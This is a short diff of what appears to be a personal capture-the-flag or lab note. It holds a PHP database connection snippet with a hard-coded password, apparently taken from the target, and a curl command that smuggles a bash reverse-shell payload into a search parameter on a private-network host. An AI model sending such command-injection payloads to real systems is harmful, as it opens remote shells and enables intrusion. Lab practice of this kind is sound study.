@@ -1,0 +1,20 @@
+wordpress/config.php
+
+<?php
+$servername = "localhost";
+$database = "desafio02";
+$username = "desafio02";
+$password = "abygurl69";
+// Create connection
+$conn = mysqli_connect($servername, $username, $password, $database);
+// Check connection
+if (!$conn) {
+    die("Connection failed: " . mysqli_connect_error());
+}
+echo "Connected successfully";
+mysqli_close($conn);
+?>
+
+
+
+curl http://192.168.56.118/site/busque.php --get --data-urlencode "buscar=/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.104/443 0>&1'"
